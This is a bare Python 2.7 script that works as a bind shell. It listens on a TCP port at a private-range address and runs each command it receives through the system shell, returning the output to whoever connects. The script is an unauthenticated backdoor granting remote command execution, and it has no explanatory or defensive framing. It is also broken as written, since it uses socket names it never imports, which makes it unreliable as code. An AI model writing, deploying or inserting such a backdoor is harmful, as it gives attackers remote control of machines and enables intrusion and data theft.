#! python2.7
import os
import subprocess
servername="192.168.56.103"
sport=12003
ssocket=socket(AF_INET,SOCK_STREAM)
ssocket.bind((servername,sport))
ssocket.listen(1)
while(1):
        try:
            connsocket,addr=ssocket.accept()
            cmd=connsocket.recv(2048)
            while(cmd!="exit" and cmd!=""):
                        print addr,"  ",cmd
                        if(cmd.startswith("cd")):
                                try:
                                        folder=cmd[cmd.index(" ")+1:]
                                        if(folder==".."):
                                                os.chdir("..")
                                        else:
                                                os.chdir(os.path.join(os.getcwd(),folder))
                                except Exception,e:
                                        output=str(e)
                                else:
                                        output="You are currently in: "+os.getcwd()
                        else:
                                try:
                                        output=subprocess.check_output(cmd,stderr=subprocess.STDOUT,shell=True)
                                except Exception,e:
                                        output=str(e)
                                else:
                                      if (output==""):
                                                output="Done"
                        connsocket.send(output)
                        cmd=connsocket.recv(2048)
                        if(cmd=="exit"):
                                print "broken"
                                connsocket.close()
                                break
            connsocket.close()
        except Exception:
                pass
